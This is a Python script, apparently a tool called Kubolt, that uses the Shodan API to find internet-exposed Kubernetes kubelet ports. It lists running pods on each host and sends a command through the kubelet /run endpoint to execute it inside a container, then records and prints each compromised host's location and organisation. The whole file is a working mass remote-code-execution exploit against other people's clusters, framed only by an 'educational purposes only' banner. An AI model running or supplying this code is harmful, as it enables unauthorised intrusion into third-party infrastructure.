
import argparse
import os
import click
import datetime
import requests
import shodan
import sys
import time

# setup
# mkdir output
# pip install -r requirements.txt

API_KEY = 'your-api-key'

api = shodan.Shodan(API_KEY)
datetime_flag = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
tmp_filename = os.path.sep.join(['output', 'recon-%s.txt' % datetime_flag])
vul_filename = os.path.sep.join(['output', 'vulnerable-%s.txt' % datetime_flag])
parser = argparse.ArgumentParser(add_help=True)
parser.add_argument('--query', action="store", type=str, dest='query')
query = 'port:10250 ssl:true 404 %s' % ''.join(filter(None, parser.parse_args().query or []))


def recon():
    try:
        print('requesting shodan with query = %s \n please wait...' % query)
        with open(tmp_filename, 'w') as file_handler:
            for ips in api.search_cursor(query):
                file_handler.write(ips['ip_str'] + '\n')
    except Exception as e:
        print('Error in recon' % e)
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()


def logo():
    blue = '\033[94m'
    white = '\033[0m'
    red = '\033[91m'
    print("""%s      
                 __  __     __  __     ______     ______     __         ______  
                /\ \/ /    /\ \/\ \   /\  == \   /\  __ \   /\ \       /\__  _\ 
                \ \  _"-.  \ \ \_\ \  \ \  __<   \ \ \/\ \  \ \ \____  \/_/\ \/ 
                 \ \_\ \_\  \ \_____\  \ \_____\  \ \_____\  \ \_____\    \ \_\ 
                  \/_/\/_/   \/_____/   \/_____/   \/_____/   \/_____/     \/_/%s

                                ==> created by averonesis <== 
                ! For educational purposes only, use at your own responsibility. !%s
    """ % (blue, red, white))


def rce():
    with open(tmp_filename, 'r') as tmp_handler:
        lines = tmp_handler.readlines()
    print('Probably vulnerable IPS: %d' % len(lines))
    try:
        with open(vul_filename, 'w') as file_handler:
            for line in lines:
                url = 'https://' + line.strip() + ':10250/runningpods/'
                try:
                    resp = requests.get(url=url, verify=False, timeout=(4, 60), cert=None)
                    if resp.text.__contains__('Unauthorized') is True:
                        pass
                    elif resp.text.__contains__('container') is True:
                        j = resp.json()
                        namespace = j['items'][0]['metadata']['namespace']
                        podname = j['items'][0]['metadata']['name']
                        container = j['items'][0]['spec']['containers'][0]['name']
                        url1 = 'https://' + line.strip() + ':10250/run/' + namespace + '/' + podname + '/' + container + '/'
                        data = "cmd=id"
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.90 Safari/537.36',
                            'Content-Type': 'application/x-www-form-urlencoded'}
                        run = requests.post(url1, headers=headers, allow_redirects=False, data=data, verify=False,
                                            timeout=(4, 60), cert=None)
                        host = api.host(ips=line.strip())
                        click.echo(click.style('<================================>', fg='blue'))
                        click.echo(click.style('VULNERABLE HOST --> ' + line.strip(), fg='red'))
                        if len(host['hostnames']) > 0:
                            click.echo('{:25s}{}'.format('Hostnames:', ';'.join(host['hostnames'])))
                        click.echo('{:25s}{}'.format('IP:', host['ip_str']))
                        if 'city' in host and host['city']:
                            click.echo('{:25s}{}'.format('City:', host['city']))
                        if 'country_name' in host and host['country_name']:
                            click.echo('{:25s}{}'.format('Country:', host['country_name']))
                        if 'org' in host and host['org']:
                            click.echo('{:25s}{}'.format('Organization:', host['org']))
                        if 'asn' in host and host['asn']:
                            click.echo('{:25s}{}'.format('ASN:', host['asn']))
                        click.echo('{:25s}{}'.format("CMD 'id' result:", str(run.text)).strip())
                        click.echo(click.style('<================================>', fg='blue'))
                        print('\n')
                        file_handler.write(host['ip_str'] + '\n')
                        time.sleep(1)
                        continue
                    else:
                        pass
                except requests.exceptions.RequestException as ec:
                    pass
                except Exception as e:
                    pass
    except EOFError:
        sys.exit()
    except Exception as e:
        print('Error in rce func' % e)
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()


def main():
    logo()
    try:
        recon()
        rce()
    except Exception as s:
        print('Error' % s)
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()
    print('Total vulnerable IPS: %d' % len(open(vul_filename, 'r').readlines()))


if __name__ == '__main__':
    main()
